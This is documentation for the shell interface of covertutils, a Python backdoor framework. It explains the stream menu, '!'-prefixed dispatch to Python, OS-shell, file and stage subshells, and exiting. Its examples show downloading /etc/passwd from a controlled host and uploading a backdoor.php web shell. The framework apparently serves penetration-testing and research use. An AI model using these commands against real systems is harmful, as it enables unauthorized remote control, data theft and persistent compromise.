

Shells & SubShells
==================

When a class from the :mod:`covertutils.shells` family is used to hook and interact with the :class:`Handler` object, several built-in features can be used.


The shells provided by the package are `(thank god)` **<Ctrl-C> resistant**, and modular, in a sense that no single shell interface accepts `every command`.

As the architecture of a `covertutils` backdoor implies, all data flows through a virtual `stream` that is identified by an OTP mechanism (see :ref:`streamidentifier_component`). The other side `(Agent)` can handle data from **different streams in different ways**.



The shell that spawns when the :meth:`covertutils.shell.BaseShell.start` method is used is almost a dummy. It runs no commands from itself. It is there to provide the `stream menu` and handle `exit commands`.
This design makes easier the creation of custom command suites, `without expanding` the parent classes (but `inheriting` from them).

Enough subshells have been created for an everyday backdoor (`shell`, `file transfer`, even `shellcode execution` see :ref:`stages_page`), but the ability to create and integrate new ones along with the existing is given through the use of a parent shell approach.


The Parent Shell
****************

Stream Menu
+++++++++++


The parent shell spawns the `stream menu` with a `<Ctrl-C>` - ``KeyboardInterrupt``. From there, the user can jump to SubShells to access real commands (either `OS` or `Python` or whatever is loaded at the given time).

.. code:: bash

	(127.0.0.1:58504)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - stage
		[99] - Back
	Select stream:


Dispatching commands with ``"!"`` `(exclamation mark)`
++++++++++++++++++++++++++++++++++++++++++++++++++++++

From the `Parent Shell` it is possible to issue commands to any SubShell just by prepending the ``"!"`` and the `stream name` before the actual command.

.. code:: bash

	(127.0.0.1:58504)> !python print "Dispatching to Python Stream"
	Dispatching to Python Stream


Typing only the ``"!"`` and the `stream name` will jump to the `stream's` SubShell.

.. code:: bash

	(127.0.0.1:58504)> !python
	[python] >>>

This way SubShells with only one or two commands can be used without directly accessed.

.. code:: bash

	(127.0.0.1:58504)> !file download /etc/passwd

.. code:: bash

	(127.0.0.1:58504)> !stage fload my_custom_module.py

.. code:: bash

	(127.0.0.1:58504)> !control reset


*The ``"!"`` can be used from SubShells too, making file transfers handy.

.. code:: bash

	[os-shell]> ls
	index.html

	[os-shell]> !file upload backdoor.php
	File uploaded succesfully!

	[os-shell]> ls
	index.html
	backdoor.php


Exiting
+++++++

Exiting the `Parent Shell` with ``exit`` or ``q`` or ``quit`` will make the :meth:`covertutils.shell.BaseShell.start` method to return. This design is preferred from the ``sys.exit(0)`` approach, as it leaves open the possibility of a `multi-shell`, used for session management purposes, providing features like the ``session -i`` of `meterpreter`.

Also the :class:`covertutils.shell.impl.StandardShell` class and derivatives contain a ``sysinfo`` class variable, populated when the ``!control sysinfo`` command is first run. This variable is accessible from outside the class, providing information of the controlled system. This can be used to create a brief line similar to `meterpreter`'s ``session -l`` command.
